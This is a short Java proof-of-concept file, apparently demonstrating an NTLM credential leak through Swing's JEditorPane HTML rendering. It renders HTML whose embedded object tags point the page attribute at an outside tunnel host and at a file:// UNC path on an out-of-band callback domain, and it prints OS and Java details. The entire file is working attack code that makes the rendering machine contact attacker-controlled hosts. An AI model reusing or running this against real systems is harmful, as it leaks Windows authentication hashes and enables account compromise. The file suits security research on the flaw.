import javax.swing.*;
import javax.swing.text.html.*;
import java.io.*;
public class SwingWindowsProof {
 static void render(String html) throws Exception {
   JEditorPane pane=new JEditorPane(); pane.setEditable(false); pane.setContentType("text/html"); pane.setText(html);
   System.out.println("Rendered: "+html);
   Thread.sleep(15000);
 }
 public static void main(String[] args) throws Exception {
   System.out.println("os="+System.getProperty("os.name")+" java="+System.getProperty("java.version")+" headless="+java.awt.GraphicsEnvironment.isHeadless());
   render("<html><body><object classid='javax.swing.JEditorPane' page=https://ddlnp-54-196-15-50.run.pinggy-free.link/swing-ntlm'></object></body></html>");
   render("<html><body><object classid='javax.swing.JEditorPane' page='file://cwgmxyssmmssmczp--ijunc1786941240.oob.blackmail.zip/share/nonexistent'></object></body></html>");
 }
}
